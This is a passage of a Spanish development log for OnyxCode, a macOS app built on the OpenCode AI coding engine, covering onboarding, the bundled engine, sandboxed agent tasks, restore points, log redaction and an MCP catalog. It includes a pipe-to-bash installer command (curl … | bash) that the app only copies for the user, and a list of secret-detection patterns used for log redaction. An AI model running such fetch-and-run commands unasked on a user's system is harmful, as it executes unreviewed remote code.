# Fase 8 — Onboarding y distribución

## F8-B1 — Detección y validación del binario de OpenCode; ajustes `onboarded` y `opencodeBin`

Canales IPC nuevos (solo ventana principal; esquema en `main/ipc/schemas.ts`, allowlist del preload por `IPC_INVOKE_CHANNELS`):
`app:opencodeInfo` (`{found, path, version, sdkVersion: '1.18.32', compatible}`; ejecuta `opencode --version` con `execFile`
sin shell, `minimalEnv`, cwd del tmp, timeout de 5 s, `compatible` = misma versión mayor y menor), `app:opencodeAction`
(lista blanca `copyInstall | openDocs | openGo | openAuth`: el renderer solo elige la clave; las URL viven en
`shared/opencode-links.ts` y se abren desde main) y `app:pickOpencodeBin` (diálogo de abrir archivo en main; valida ruta
absoluta, archivo regular, `X_OK` y que `--version` termine bien e imprima algo; guarda `settings.opencodeBin`).

Ajustes nuevos: `onboarded: boolean` y `opencodeBin: string` (`''` = detección automática; se normaliza a ruta absoluta sin
bytes nulos). `settings:set` acepta `onboarded` pero NO `opencodeBin`: solo main lo escribe, tras validar el binario.
`findOpencodeBinary` ahora sigue el orden `OPENCODE_BIN` → `settings.opencodeBin` → PATH y carpetas habituales.

Comando de instalación (solo se copia, la app nunca ejecuta un instalador): `curl -fsSL https://opencode.ai/install | bash`.
Salió del propio binario de OpenCode (su rutina de actualización descarga `https://opencode.ai/install` y lo ejecuta con
bash) y del mensaje de error que ya tenía la app; el binario instalado vive en `~/.opencode/bin`, coherente con ese script.

Test: `src/main/opencode/binary.test.ts` (archivos temporales reales: ejecutable válido, symlink, sin permiso, directorio,
inexistente, relativa, `--version` mudo/fallido/colgado con timeout, ruta con metacaracteres, orden de `findOpencodeBinary`),
`src/shared/opencode-links.test.ts` (SDK = `package.json`, URL solo `https://opencode.ai`).

## F8-B2 — `ProviderKeyForm` compartido

Se extrae de `ModelsSection` el formulario «Conectar proveedor con API key» (`features/settings/impl/ProviderKeyForm.tsx`,
más `saveProviderKey`: `auth.set` + `global.dispose`). Sin cambio visual. Cambio menor: si el servidor rechaza la clave, el
campo ya no se vacía. Test: typecheck/lint y `e2e/specs/onboarding.e2e.ts` (c) (la ruta `PUT /auth/…` es la misma).

## F8-B3 — Asistente de primer uso

`features/onboarding/` (`steps.ts` puro + `Wizard.tsx`, montado en `App`). Se muestra SOLO si `onboarded !== true` y (falta el
binario o ningún proveedor está configurado); si todo ya funciona se marca `onboarded: true` en silencio. Una vez mostrado
no se oculta solo. Pasos: 1 OpenCode (copiar comando, abrir instrucciones, elegir binario, reintentar), 2 OpenCode Go (enlaces
y `ProviderKeyForm` fijo a `opencode-go`), 3 modelo (`ModelPicker` → `defaultModel`), 4 los cuatro modos (`MODE_LABELS`),
5 permisos de macOS (solo explicación). «Saltar» y «Empezar» guardan `onboarded: true`.

Hallazgo: un OpenCode recién instalado y sin claves ya «conecta» el proveedor gratuito `opencode` (origen `custom`); si contara
como proveedor, el asistente no aparecería nunca a un usuario nuevo. `isConfiguredProvider` lo excluye.

Test: `features/onboarding/steps.test.ts` (usuario existente no lo ve, sin binario → paso 1, sin proveedor → paso 2, esperas,
navegación). E2E `e2e/specs/onboarding.e2e.ts`: (a) `OPENCODE_BIN` inexistente → paso 1 con el error y «Reintentar»;
(b) «Elegir binario…» con `stubDialog` → avanza y persiste `opencodeBin`; (c) clave → `PUT /auth/opencode-go`;
(d) `onboarded` persiste y no reaparece tras reiniciar con el mismo userData. Los harness (`e2e/lib/launch.ts`,
`e2e/smoke.mjs`) siembran `onboarded: true`; `startApp` gana `userData`, `keepUserData`, `noServer` y `connectFake()`.

## F8-B4 — `scripts/fetch-opencode.mjs`: descarga verificada del OpenCode oficial fijado

`resources/opencode-bin/pin.json` fija `version`, `url` (release oficial de GitHub), `sha256` y `size` del ZIP. El script
descarga con `https` (siguiendo redirects), verifica tamaño y SHA-256 ANTES de descomprimir (si no coinciden borra todo y no
extrae), usa `ditto -x -k`, `chmod 755` y comprueba que `--version` (HOME/XDG temporales, entorno mínimo) sea `pin.version`.
`--if-missing` no descarga si ya hay un binario correcto. Solo se engancha en `npm run package`; `dev`, `build` y `verify`
no lo ejecutan ni necesitan red.

## F8-B5 — El OpenCode fijado viaja dentro del .app

`electron-builder.js`: `extraResources` copia `resources/opencode-bin/bin/opencode` a `Contents/Resources/opencode/opencode` y
`resources/opencode-bin/**` queda fuera del `.asar`. Con Developer ID el binario se añade también a `mac.binaries` (hardened
runtime + `entitlements.mac.plist`, que ya trae JIT/memoria ejecutable que necesita el motor de JavaScript del binario).

## F8-B6 — Resolución del binario con el OpenCode embebido y `source` en `app:opencodeInfo`

`OpencodeInfo` gana `source: 'env' | 'settings' | 'cli' | 'bundled' | null`. Orden nuevo: `OPENCODE_BIN` → `settings.opencodeBin` →
CLI del usuario SI es compatible (misma mayor.menor que el SDK) → embebido (`<Resources>/opencode/opencode`, solo con
`app.isPackaged`) → CLI incompatible como último recurso. La versión del CLI se mide con `execFile` asíncrono (timeout 5 s) y se
cachea por (ruta, mtime); solo se mide si hay embebido: en desarrollo (sin embebido) el comportamiento es idéntico al anterior
(mismo CLI, sin ejecutar `--version` extra). `startTasksServer`, el sidecar y `app:opencodeInfo` usan `resolveOpencodeAsync`;
`findOpencodeBinary` sigue siendo síncrona (usa solo la caché). `ONYXCODE_TEST_BUNDLED_DIR` (solo tests, ignorada empaquetado)
simula el directorio embebido. El paso 1 del asistente no cambia todavía.

## F8-B10 — Asistente: paso 1 informativo con el motor incluido

Con `source === 'bundled'` el paso 1 («Motor incluido») muestra «Incluido: OpenCode <versión>» sin pedir instalar nada, permite
«Continuar» aunque el servidor aún arranque y ofrece «Usar mi CLI…» (`app:pickOpencodeBin`). Con CLI propio o sin binario (desarrollo)
todo sigue como antes. `decideOnboarding` no cambia de criterio (solo `onboarded !== true` y falta binario o ningún proveedor); con el
embebido `missing` no ocurre empaquetado, así que en la práctica abre en el paso 2. Lógica pura nueva en `steps.ts`
(`opencodeStepMode`, `stepTitle`, `canAdvance` con `source`) y casos en `steps.test.ts`. E2E (e) con `ONYXCODE_TEST_BUNDLED_DIR`; el OpenCode
falso lee `connected.json` junto a él para arrancar sin proveedores (el sidecar no hereda variables ajenas).

## F8-B7 — Test de contrato con la API de OpenCode (`npm run check:opencode`)

`scripts/check-opencode.mjs` arranca un binario (por defecto el fijado; `--bin <ruta>`; `--latest` descarga la última release oficial a un
temporal verificando el `digest` de GitHub) con `HOME`/`XDG_*` temporales en un puerto libre, lee `/doc` y lo mata siempre. Comprueba que
existen todas las rutas que la app usa, compara el conjunto de rutas y la forma (hash de request/response con `$ref` resueltos) de las usadas
con `resources/opencode-bin/api-routes.json` (188 rutas a 1.18.33). Salida 0 (rutas nuevas informativas), 1 falta una ruta usada, 2 cambió un
esquema usado, 3 error de infraestructura; `--update-snapshot` reescribe la instantánea (solo a mano al subir el pin). La lógica pura está en
`scripts/opencode-contract-lib.mjs` (+ `.d.mts`).

## F8-B8 — Rutas usadas derivadas del código y test unitario

`usedRoutes()` recorre `src/**/*.ts(x)` (sin `*.test.*`) y resuelve `<cliente>.<ns>(.<ns>)*.<método>(` contra el árbol de namespaces de
`sdk.gen.js` (cubre `client`, `run.client`, `getClient()`, cadenas multilínea y `?.`; ignora `api.pty` del preload) y los `fetch`/peticiones
directas al sidecar (`/global/health`, `/global/dispose`, `/session/status`, `/session/{id}`, `/permission`…). Hoy: 42 rutas. `src/test/opencode-contract.test.ts`
(sin binario ni red): rutas usadas existen en el SDK, la instantánea coincide con el SDK (188) y contiene las usadas, y el comparador da 1/0/2.

## F8-B9 — `docs/ACTUALIZAR-OPENCODE.md`

Política de versión fijada (subida mensual, no por release; `info.version` fijo `1.0.0`) y procedimiento: `--latest` → revisar diff → `pin.json`
→ SDK → `--update-snapshot` → `npm run verify` → probar el `.dmg`.

## F8-B11 — Aviso de motor no probado y fila «Motor» en Acerca de

`lib/engine-notice.ts` (puro, con tests): `engineNoticeText` devuelve «Estás usando OpenCode X; OnyxCode se probó con Y. Si algo falla, usa el
motor incluido.» solo si el motor no es el incluido, la versión se conoce y `compatible === false` (otra mayor.menor que el SDK); un aviso
cerrado no vuelve para esa versión (`localStorage`, con try/catch). `app/EngineNotice.tsx` lo muestra bajo el banner del servidor (no bloquea) y
Ajustes › Acerca de añade «Motor: OpenCode <versión> (incluido | tu CLI | ruta elegida)».

## F8-B12 — `THIRD_PARTY_NOTICES.md`

Avisos de OpenCode (MIT, 1.18.33), Bun/JavaScriptCore (LGPL-2: aviso y enlaces a las fuentes, binario oficial sin modificar; no se afirma
cumplimiento) y Electron/Chromium, más el marcador «LICENCIA PROPIA DE ONYXCODE: PENDIENTE». `electron-builder.js` (`extraResources`) lo copia a
`Contents/Resources/THIRD_PARTY_NOTICES.md` y copia también `LICENSE` y `LICENSES.chromium.html` de Electron a `Contents/Resources/licenses/electron/`
(electron-builder no los deja dentro del `.app`; comprobado con un empaquetado `--dir` en un directorio temporal).

## F8-B13 — README y DISTRIBUCION

README: OpenCode ya viene incluido, el CLI es opcional (`opencode auth login` ya no hace falta), sección «Motor» y corrección de la frase sobre
credenciales (las Tareas leen el `auth.json` de OpenCode y solo pasan un valor centinela al sandbox, con la clave real en un proxy local).
`docs/DISTRIBUCION.md` §9 «Motor embebido»: origen, pin y SHA-256, descarga, firma, avisos, política de actualización, tamaño (~170 MB) y comprobación.

## F8-B14 — `share: "disabled"` en la config inline de OpenCode

`buildInlineConfig` (sidecar principal, `opencode/config.ts`) y el de Tareas (`tasks/inline-config.ts`) fijan `share: 'disabled'` junto a
`autoupdate: false`: `/share` es lo único que sube conversaciones a opencode.ai. El orden de fusión de OpenCode (leído en el binario incluido) es
global < `OPENCODE_CONFIG` < proyecto < `.opencode/` < `OPENCODE_CONFIG_CONTENT` (inline) < config de organización < política gestionada, así que un
`share` del usuario o del proyecto no lo pisa (`autoshare:true` solo actúa si no hay `share`). Los snapshots cambian solo por la línea `share`.

## F8-B15 — Aviso de Rutinas y los términos de OpenCode

Ajuste `routinesTermsAcknowledged` (falso por defecto; tipo, normalización, esquema de `settings:set`). Lógica pura en `shared/routines-terms.ts`
(`shouldRunUnattended`, `needsRoutinesNotice`, `needsRoutinesConsent`, textos). Crear/activar/guardar activada una rutina sin reconocimiento abre un
`ConfirmDialog` (nuevo `focusCancel`: foco y Enter en «Cancelar»); la vista de Rutinas muestra un aviso no bloqueante con «Ver aviso y activar». El
planificador no ejecuta rutinas por horario sin el reconocimiento (log único); «Ejecutar ahora» sigue funcionando. Las rutinas existentes no se
tocan. Tests: lógica pura, planificador con reloj falso y E2E `routines-terms`. Verificado por grep que no existe rotación de cuentas ni exportación
de datos para entrenar modelos.

## F8-B16 — Tareas con sandbox: fallar cerrado con las credenciales de proveedor

`placeholderAuthContent` (`main/tasks/provider-egress.ts`) reescribía solo `opencode-go` y pasaba TAL CUAL (clave real, `access`/`refresh` OAuth) cualquier
otra entrada al `OPENCODE_AUTH_CONTENT` del servidor sandboxeado. Ahora es una lista blanca: solo los proveedores de `PROVIDER_TARGETS` con `key` de texto
no vacío salen, con una entrada nueva `{type:'api', key:<centinela aleatorio>}`; todo lo demás se omite y sin ninguno el contenido es `{}` (comprobado con
el binario real, HOME/XDG temporales: arranca y solo conecta el proveedor gratuito). Cambio visible: en Tareas con sandbox solo está disponible OpenCode
Go; (más los modelos gratuitos `opencode`, sin clave); con un modelo cuyo proveedor el servidor sandboxeado no tiene, nota junto al selector y error legible al enviar, según la lista del propio servidor (`shared/sandbox-providers.ts`, borrador conservado); Control total, Chat y Code no
cambian. README, SEGURIDAD y el comentario de cabecera describen ahora exactamente esto (sin aislamiento de credenciales fuera del sandbox). Tests:
`provider-egress.test.ts` (solo Go con centinela, OAuth/otros omitidos, prueba de propiedad con claves aleatorias, centinela distinto por llamada,
entradas malformadas, comprobación estática de `sandbox.ts`), `sandbox-providers.test.ts`.

## F8-B17 — Conexión propia: auth y datos de la app aislados del CLI

OnyxCode ya no comparte `~/.local/share/opencode` con el CLI. El sidecar principal y el servidor de Control total reciben `XDG_DATA_HOME=userData/opencode-data`
(`getOpencodeEnv`, `opencode/data-dir.ts`); el motor escribe ahí `opencode/auth.json` (0600) y su base de sesiones. Las Tareas con sandbox mantienen sus XDG privados
(`sandboxEnv` va después en el spread y pisa el valor). No se usa `OPENCODE_AUTH_CONTENT` en el sidecar principal: en 1.18.33 sustituye al `auth.json` y `PUT /auth` y el
callback OAuth escriben en disco (`Path.data/auth.json`). `readProviderAuth` (sandbox) lee ahora `appAuthFile(userData)` y no el fichero del CLI; sigue fallando cerrado (sin fichero,
sin `OPENCODE_AUTH_CONTENT` ni proxy). Al arrancar, tras las migraciones, se crea el almacén; si es nuevo en una instalación que ya tenía chat-workspace y asistente hecho, se pone
`onboarded:false` (vía `settingsStore.set`) para reabrir el asistente una sola vez. No se migran sesiones ni credenciales del CLI (las sesiones anteriores dejan de verse; decisión del
usuario). Textos de Ajustes › Modelos actualizados. El OpenCode falso de E2E imita al real (`OPENCODE_AUTH_CONTENT`, `auth.json` en `XDG_DATA_HOME`, `GET /__e2e/env` sin valores) y la
spec `own-auth.e2e.ts` cubre: el CLI no cuenta como conectado, el almacén propio sí, reapertura única y Tareas con sandbox. Riesgo residual documentado: `provider.*.options.apiKey` en
`~/.config/opencode/opencode.json` (config compartida) seguiría apareciendo conectado. README, SEGURIDAD y AUDIT ajustados.

## F8-B18 — Aviso de versión nueva (sin autoinstalación)

Aviso no bloqueante en la app instalada: «Hay una versión nueva de OnyxCode (X.Y.Z).» con «Descargar» (abre la página de la release) y «Más tarde». Consulta
`GET https://api.github.com/repos/{owner}/{repo}/releases/latest` sin autenticar, como mucho una vez cada 24 h, y compara con `app.getVersion()`. `RELEASES_REPO` (`shared/brand.ts`) está
vacío: sin red y aviso apagado hasta que exista el repositorio; `verify:release` exige definirlo. Lógica pura en `shared/update-check.ts` (semver con prerelease, validación de repo y de la
URL de la release, plazos y `Retry-After`); servicio `main/update/` (`config.ts` con las variables de test solo sin empaquetar, `checker.ts` con estado atómico en `userData/update-check.json`);
canales `app:updateState` (invoke + evento), `app:checkUpdates`, `app:dismissUpdate`; ajuste `checkUpdates` (activado por defecto) y sección «Actualizaciones» en Ajustes › Acerca de
(interruptor, «Buscar ahora», última comprobación). E2E con un servidor local de releases (`e2e/lib/releases-server.ts`, `update-check.e2e.ts`; en E2E `app.getVersion()` es la de Electron,
por eso las «versiones nuevas» de las pruebas son 99.x). README (Privacidad), SEGURIDAD (3 quinquies) y DISTRIBUCION (§10, migración a `electron-updater`). Riesgos documentados: `redirect: 'error'`
(un repositorio renombrado nunca avisa), `/releases/latest` no devuelve prereleases, el `fetch` de Node no usa el proxy del sistema, sin `retryAfter` persistido un fallo se reintenta en el
siguiente arranque pasada 1 h, y el aviso solo vive en memoria (tras reiniciar dentro de las 24 h no vuelve a mostrarse hasta la siguiente comprobación).

## F8-B19 — Cuentas, Fase 1: cliente + servidor de autenticación falso (APAGADO)

Cuenta obligatoria con servidor propio, **apagada por defecto**: `ACCOUNT_API = null` (`shared/brand.ts`) y la app no exige login, no habla con ningún servidor de cuentas y no muestra la
sección «Cuenta». Entradas: Google por loopback (RFC 8252) con PKCE S256 (no por `onyxcode://`) y correo con **código de 6 dígitos** (sin contraseñas; la pantalla dice «Crear una cuenta»).
Lógica pura en `shared/account.ts` (`decideAccess`: sesión válida abre; servidor caído → entra mientras la última validación correcta tenga < 30 días; 401 bloquea al instante; 404/410 = cuenta
borrada; reductor de estado; validación de correo/código). Main: `main/account/` (`pkce`, `store` con `safeStorage` → `userData/account.bin` y solo memoria si no hay cifrado, `loopback` de un solo GET
con `state`, `client` con `net.fetch` sin cookies/redirecciones/`Origin`, `service` con validación al arrancar y cada 24 h, `config`, `access`). Canales `account:*` + evento `account:changed` (solo ventana
principal). Renderer: `<AccountGate><App/></AccountGate>` (la app y el asistente «Conecta tu IA» no se montan hasta pasar), pantalla de acceso con casilla de términos **desmarcada**, enlaces a
política/términos (constantes vacías → borrador local) y Ajustes › Cuenta (cerrar sesión, descargar mis datos, borrar mi cuenta sin tocar las claves de IA). Quick Entry, atajo global y bandeja solo actúan con
la cuenta al día. Servidor falso `e2e/fake-auth/` (PKCE verificado, códigos de un solo uso, modos `down|401|410`) y `e2e/specs/account.e2e.ts`; `launch.ts` admite `account: { fake, signedIn }` y por
defecto los E2E existentes no usan cuenta. Docs: SEGURIDAD §3 sexies («pendiente de activación»), `PRIVACIDAD-BORRADOR.md`, `TERMINOS-BORRADOR.md` (borradores sin revisión legal),
`CUENTAS-SERVIDOR.md` (contrato para la Fase 2) y `CUENTAS-ACTIVACION.md` (textos a cambiar al activar). No probado: Google real, servidor real, Llavero real.

## F8-B20 — Puntos de restauración en Tareas

Instantánea propia de la app (no git: el revert de OpenCode solo toma instantáneas en repos git y en carpetas sin git ocultaba mensajes sin restaurar archivos, aunque el diálogo de «Editar y
reintentar» prometía lo contrario). `main/tasks/restore-points.ts` (puro, `trash`/`now`/`root` inyectables): almacén `userData/restore-points/<hash16>/` direccionado por hash con clon COW, incremental,
límites (20 000 archivos, 50 MB por archivo, 2 GB; `.git`, `node_modules`, `.onyxcode` excluidos; symlinks registrados, nunca seguidos), retención de 20 puntos por tarea y 30 días con recolección de huérfanos,
restauración atómica con punto «Antes de deshacer», Papelera para lo creado después y validación de rutas contra symlinks. Contrato y esquemas `tasks:restore:{create,list,changes,apply,forget}` (solo ventana
principal; `apply` devuelve el nuevo código `BUSY` si el monitor ve trabajo en la carpeta; `IpcErrorCode` gana `'BUSY'`). `ONYXCODE_E2E_TRASH_DIR` (Papelera de pruebas) solo sin empaquetar, con guardia
estática. Renderer: `sendToTask` guarda el punto antes de `promptAsync` («Guardando punto de restauración…»; si falla o se omite se envía igual y avisa), `DiffView` pasa a `components/`, sección «Cambios en
archivos» (`ChangesPanel.tsx`: Nuevo/Modificado/Eliminado, +N −M, diff, «Deshacer los cambios de esta tarea»), «Deshacer desde aquí» y «Rehacer», «Editar y reintentar» restaura el punto del turno, y la tarjeta de
permisos muestra el diff y ofrece «Rechazar con indicaciones» (`replyPermission(id,'reject',mensaje)`). Se crean puntos también en Control total (decisión del usuario: ahí el agente podría manipular el
almacén; la interfaz lo avisa). Servidor falso: paso de guion `fs` (escribe/borra archivos reales confinados al directorio de la sesión). E2E `restore.e2e.ts` con capturas (`RESTORE_SHOTS_DIR`). SEGURIDAD §3 octies.
Limitaciones: no cubre carpetas vinculadas con escritura; el panel lateral no aparece por debajo de 1024 px (ya ocurría con el panel de progreso; «Deshacer desde aquí» sigue disponible).

## F8-B21 — Robustez de los puntos de restauración (pérdida de datos)

Corrige un fallo real de F8-B20: si `copyFileSync` fallaba al crear el punto (permisos, E/S, iCloud) el catch **omitía** la entrada del manifiesto; `diffState` veía ese archivo como `added` y «Deshacer»
lo mandaba a la Papelera aunque existía antes (H1). Igual con un subdirectorio ilegible (H2). Ahora: H1 el archivo se registra con `hash:null` y `skip:'unreadable'|'cloud'|'nospace'`; H2
`manifest.unreadableDirs` (ni diff ni apply tratan como nuevo lo de debajo); H3 copia (`fs.promises.copyFile` con `COPYFILE_FICLONE`) y hash por flujo asíncronos, también en el diff (40 MB: retraso del bucle
< 200 ms, con test); H4 `createdAt` en el manifiesto y hash recalculado si `mtimeMs >= createdAt - 2000` (FAT/exFAT/HFS+); H5 presupuesto `maxCreateMs` 30 s: pasado, punto `skipped` («tardaba
demasiado») y temporales limpiados (y el renderer limita la espera a 35 s); H6 espacio libre con `statfsSync` inyectable (`freeBytes`): bytes a copiar + 512 MB, o ENOSPC → `skipped` «no queda espacio en el
disco»; H7 iCloud «solo en la nube» (`size>0 && blocks===0`, predicado inyectable): no se lee, `hash:null`, `meta.notCopied`, stubs `.<nombre>.icloud` en `cloudStubs` y un `added` que sea un stub no va a la
Papelera; H8 `.DS_Store` y `._*` ignorados en recorrido y diff; H9 `applyDiffs` manda primero todo lo nuevo a la Papelera y luego restaura (volúmenes sin distinción de mayúsculas); H10 `chmod` de mejor esfuerzo;
H11 `forget()`/`clearAll()` (ahora asíncronos) esperan los locks en curso; H12 mensaje «La carpeta no está disponible (¿disco desconectado?)». Contrato: `TasksRestorePoint.notCopied?`,
`TasksRestoreChange.reason?: 'large'|'cloud'|'unreadable'`; el panel «Cambios en archivos» explica «No restaurable (solo en la nube)…» y la conversación avisa si un punto no incluye archivos. Sin IPC nuevo.
Tests: `restore-points.test.ts` (H1, H2, H4-H9, H11, H12 y retraso del bucle), `restore-points.fs.test.ts` (`npm run test:fs`, ExFAT/FAT32/HFS+ mayúsculas), `restore-points.stress.test.ts`
(`npm run test:stress`), E2E `restore.e2e.ts` ampliado con archivos dispersos; `shot()` pasa a `e2e/lib/shots.ts`. Limitaciones: el aviso de espacio es conservador (cuenta el tamaño completo aunque APFS clone);
un archivo que desaparece a mitad de la copia se omite (como antes); iCloud real no probado (solo imitado con archivos dispersos).

## F8-B22 — «Probar clave» de un proveedor

Ajustes › Modelos gana el botón «Probar» por proveedor conectado, y guardar una clave la prueba sola (formulario de Modelos y asistente de primer uso). Todo ocurre en main
(`main/providers/key-probe.ts`): lee la clave ya guardada en `auth.json` (`appAuthFile`) y hace un GET **gratuito** (listado de modelos o información de la clave) con `net.fetch` inyectable,
`redirect: 'manual'`, 10 s de tope, y del cuerpo solo se usa el código HTTP. La clave **no cruza el IPC ni vuelve al renderer**; no se tocó el proxy de credenciales. Canal `app:testProviderKey`
(`{providerID}` → `KeyTestResult {providerID,status,httpStatus,latencyMs,checkedAt}`; solo ventana principal; `BUSY` si hay otra prueba del mismo proveedor en curso o hace < 5 s). Estados:
`ok, invalid, forbidden, rate-limited, no-credit, offline, unreachable, provider-down, timeout, unexpected, not-stored, oauth, unsupported`, con textos en `shared/key-test.ts` (`keyTestText`).
Tabla `PROBES` (anthropic, openai, google, openrouter, groq, mistral, deepseek, xai) **verificada con curl y una clave inválida** (401, o 400 en Google y xAI, que lo declaran en `invalidStatuses`);
`/api/v1/models` de OpenRouter es público y por eso se usa `/api/v1/key`. `opencode` y `opencode-go` **no** están: su `/models` responde 200 sin clave (daría un falso «funciona») → `unsupported`.
Alternativa genérica: proveedores `@ai-sdk/openai-compatible` con `api` https (`models.*.api` de `GET /provider` del motor, consultado desde main) → `GET {api}/models` con Bearer.
La clave de Google va **solo** en la cabecera `x-goog-api-key`. Errores de red de las dos familias (Node y `net::ERR_*`): `net.isOnline()` falso → `offline`, si no `unreachable`; los errores se construyen a
mano (nunca se reenvía un `Error` ajeno). `ONYXCODE_E2E_KEY_PROBE_BASE` (solo `!app.isPackaged` y solo `http://127.0.0.1:<puerto>`, con guardia estática en `key-probe.test.ts`) permite apuntar a un servidor local.
Renderer: `useKeyTest.ts` (store con el estado de cada prueba), `KeyTestNotice.tsx` y `ModelsSection` («Probar», «Cambiar clave» tras una clave inválida o sin permiso). Tests: `key-probe.test.ts` (matriz de
estados y errores, `redirect:'manual'`, `not-stored`/`oauth`/`unsupported` sin petición, propiedad con claves aleatorias: ni el resultado ni `console.*` la contienen; Google nunca en la URL),
`key-test.test.ts`, `KeyTestNotice.test.tsx`, `schemas.test.ts`; E2E `key-test.e2e.ts` con `e2e/lib/probe-server.ts` (capturas `DIAG_SHOTS_DIR`). No probado: claves reales de ningún proveedor.

## F8-B23 — Ajustes › Diagnóstico (registros del motor redactados)

Sección nueva «Diagnóstico» (antes de «Acerca de»): tarjeta «Estado» (estado, reinicios, versión, último error, «Reiniciar OpenCode») y tarjeta «Registros» (fuente, filtro, «Actualizar», «Cada 2 s»,
«Copiar», «Exportar…»). Main: `diagnostics/log-ring.ts` (`LineRing`, 2000 líneas / 512 KB con última línea parcial; `OpencodeServer.log()` lo usa y el arranque sigue mostrando `tail(5)`; único cambio en
`opencode/server.ts` además del getter `secrets()` y `recentLog()`), `diagnostics/redact.ts` (`makeRedactor`: primero secretos **exactos** —contraseña y credencial Basic del sidecar, todos los valores
de `auth.json`, `headers`/`environment` de los MCP— del más largo al más corto; luego patrones lineales de `shared/redact-patterns.ts`: Bearer/Basic, `sk-`, `sk-ant-`, `AIza`, `gh*_`, `github_pat_`, `xox*`,
`glpat-`, `AKIA`, JWT, `clave=valor`, `?key=`, `usuario:clave@`, rachas largas con cifras; la carpeta del usuario pasa a `~`; líneas a 4000 caracteres; se redacta **antes** de recortar) y
`diagnostics/service.ts` (fuentes `engine`, `engine-file` —últimos 256 KB del `.log` más reciente por desplazamiento— y `report`). `redactSecrets` de `shared/ai-errors.ts` usa los mismos patrones. No hay
registros del sandbox de Tareas. Canales `diag:logs`, `diag:copy` (portapapeles desde main) y `diag:export` (diálogo «Guardar como», archivo `OnyxCode-diagnostico-AAAAMMDD-HHmm.txt` con 0600), solo ventana
principal. Tests: `redact.test.ts` (patrones, exactos, propiedad con secretos incrustados, líneas adversarias de 1 MB < 200 ms), `log-ring.test.ts`, `service.test.ts` (incluye la guardia estática: los
handlers `diag:*` solo devuelven lo que sale de `DiagnosticsService` y solo `service.ts` lee el anillo crudo), `schemas.test.ts`; E2E `diagnostics.e2e.ts` (ruta nueva `POST /__e2e/log` del servidor falso;
pantalla, IPC, portapapeles y exportación sin secretos, 0600). Limitación: un secreto sin forma conocida y que no esté guardado en `auth.json`/MCP puede pasar (la nota de la pantalla pide revisar antes de compartir).

## F8-B24 — Catálogo MCP curado

Ajustes › MCP gana un bloque «Catálogo» con conectores verificados, incluidos en la app (nada se descarga): Context7 y Cloudflare Docs (sin cuenta), GitHub (token personal) y Linear, Notion, Sentry y Atlassian
(inicio de sesión OAuth). v1 solo ofrece servidores **remotos** (URL https): añadir uno no ejecuta ningún programa en el Mac, y nada se escribe ni se conecta sin confirmar en un diálogo que enseña qué podrá hacer, el host
(en negrita) y la URL completa, qué datos salen, el JSON exacto que se guardará (secreto como «••••»), «Verificado el …» con enlace a la documentación oficial, «Preguntar antes de cada uso» (activado) y «Disponible en
Tareas» (desactivado, sin efecto en esta versión); «Cancelar» tiene el foco inicial. Contrato: `src/shared/mcp-catalog.ts` (`McpCatalogItem`, `MCP_CATALOG_VERSION`); IPC `mcp:catalog` y `mcp:installCatalog` (solo ventana
principal; el renderer manda id, nombre y valores, y **main construye la entrada desde su copia**: valida patrones anclados, rechaza CR/LF y tamaño, token/sin credencial → `oauth:false`). Procedencia en
`userData/mcp-catalog-installs.json` (0600; no se añaden claves a `opencode.json`) con detección de desvío («Modificado» si cambian la URL, las cabeceras o el tipo; mover/renombrar la arrastra). «Preguntar antes de cada
uso» escribe `permission["<nombre>_*"] = "ask"` (formato **verificado con el binario real**: la config lo acepta y `opencode debug agent` lo lista como regla `ask`); renombrar mueve la regla y eliminar limpia entrada, regla
`ask` y procedencia (una regla propia distinta se respeta). `opencode.json` pasa a escribirse con permisos 0600 (puede contener un token). Nombre repetido → error y la interfaz propone `-2`.
`npm run check:mcp-catalog` (manual, con red, fuera de `verify`) comprueba que cada URL responde como MCP (200/401/405) y que su documentación responde 200.
Tests: `shared/mcp-catalog.test.ts` (ids/nombres únicos y NAME_RE, solo https/remote, host del proveedor, patrones anclados con una `{value}`, sin secretos, `verifiedAt`, sin términos prohibidos),
`main/extras/mcp-catalog-install.test.ts` (CRLF, id desconocido, colisión, 0600, desvío, limpieza, rollback), `schemas.test.ts`, `McpCatalogDialog.test.tsx` y E2E `mcp-catalog.e2e.ts` (con capturas `MCP_SHOTS_DIR`).
Descartado/ajustado respecto al plan: Atlassian usa `https://mcp.atlassian.com/v2/mcp` (su documentación ya publica v2 y anuncia que v1 pasará a v2 el 1-mar-2027). Los cuatro servicios OAuth (Linear, Notion, Sentry, Atlassian)
registran cliente dinámicamente con el binario real (devuelven URL de autorización; el inicio de sesión completo con cuenta real no se probó). Limitaciones: en Tareas no están disponibles (sandbox sin OAuth y sin
host añadido); el token queda en texto plano en el archivo de la app como en el flujo manual; las fichas no se actualizan solas (cambian con la app; `MCP_CATALOG_VERSION`).

## F8-B25 — Idioma: inglés (beta) con selector

Ajustes › General › Idioma (Sistema / Español / English (beta)). Con «Sistema», un sistema con idioma preferido `en-*` da inglés y cualquier otro español; una instalación que ya existía (con el asistente terminado) y no
tiene `language` se queda en español, las nuevas siguen al sistema. El cambio es en vivo (sin reiniciar): `<html lang>`, fechas con el idioma activo, bandeja y menú de la app reconstruidos. Infraestructura sin dependencias
en `src/shared/i18n` (`Lang`, `LangPref`, `resolveLang`, `migrateLanguage`, `format` con `{nombre}`, plurales `{one,other}` con `Intl.PluralRules`; `es/*.ts` es la base `as const` y `en/*.ts` usa
`satisfies Messages<typeof es.x>`: el compilador exige las mismas claves). Renderer: `lib/i18n.ts` (`useLang`, `useT()`, `useLocale()`, caché en localStorage para no parpadear) y `LangRoot`, que vuelve a pintar el árbol al cambiar
sin remontarlo. Main: `src/main/i18n.ts`. `labels.ts` pasa a getters (`MODE_LABELS`, `UI_LABELS`) que leen el idioma activo; con `es` el producto queda igual (snapshots y tests sin cambios).
Alcance migrado: barra lateral, modos, paleta, avisos (`ServerBanner`, `UpdateNotice`, `EngineNotice`, `NoAiBanner`), Ajustes completo (General, Modelos y «Probar clave», MCP y catálogo, Tareas, Red, Control del Mac, Modo auto,
Navegador, Uso, Atajos, Diagnóstico, Acerca de, Cuenta), asistente, pantalla de acceso, Chat, componentes comunes y `ConfirmDialog`, `shared/ai-errors.ts`, `lib/update-notice.ts`, `lib/engine-notice.ts`, bandeja y menú.
Guardias: `visible-terms` ya escanea `src/shared` (en inglés prohíbe Artifact, computer use, Teach mode, Dispatch y Claude; usar Preview, Mac control, Guide mode) con la excepción de Acerca de ampliada a «not affiliated with
OpenCode or Anthropic»; `i18n.test.ts` (mismas claves, sin vacíos, mismos marcadores, sin claves repetidas entre áreas, `resolveLang`, migración, plurales); `i18n-coverage.test.ts` (lista MIGRATED sin JSX ni literales en español
